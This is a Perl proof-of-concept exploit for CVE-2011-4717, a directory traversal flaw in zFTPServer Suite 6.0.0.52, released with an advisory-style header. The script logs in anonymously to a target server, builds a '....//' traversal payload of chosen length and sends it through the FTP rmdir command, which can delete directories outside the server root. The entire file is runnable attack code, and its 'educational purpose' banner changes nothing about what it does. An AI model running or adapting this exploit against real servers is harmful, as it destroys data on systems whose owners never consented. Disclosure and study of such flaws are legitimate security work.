#!/usr/bin/perl
#################################################################################
# Advisory:		zFTPServer Suite 6.0.0.52 'rmdir' Directory Traversal
# Author:		Stefan Schurtz
# Contact:		sschurtz@t-online.de
# Affected Software:	Successfully tested on zFTPServer Suite 6.0.0.52
# Vendor URL:		http://www.zftpserver.com/
# Vendor Status:	fixed
# CVE-ID:		CVE-2011-4717
# PoC-Version: 		0.2
#################################################################################
use strict;
use Net::FTP;

my $user = "anonymous";
my $password = "anonymous@";

########################
# connect
########################
my $target = $ARGV[0];
my $plength = $ARGV[1];

print "\n";
print "\t#######################################################\n";
print "\t# This PoC-Exploit is only for educational purpose!!! #\n";
print "\t#######################################################\n";
print "\n";

if (!$ARGV[0]||!$ARGV[1]) {
	print "[+] Usage: $@ <target> <payload length>\n";
	exit 1;
}

my $ftp=Net::FTP->new($target,Timeout=>15) or die "Cannot connect to $target: $@";
print "[+] Connected to $target\n";

########################
# login
########################
$ftp->login($user,$password) or die "Cannot login ", $ftp->message;
print "[+] Logged in with user $user\n";

###################################################
# Building payload '....//' with min. length of 38
##################################################
my @p = ( "",".",".",".",".","/","/" );
my $payload;

print "[+] Building payload\n";

for (my $i=1;$i<=$plength;$i++) {
	 $payload .= $p[$i];
	 push(@p,$p[$i]);
}
sleep(3);

#########################################
# Sending payload
#########################################
print "[+] Sending payload $payload\n";
$ftp->rmdir($payload) or die "rmdir failed ", $ftp->message;

##########################################
# disconnect
##########################################
print "[+] Done\n";
$ftp->quit;
exit 0;
#EOF
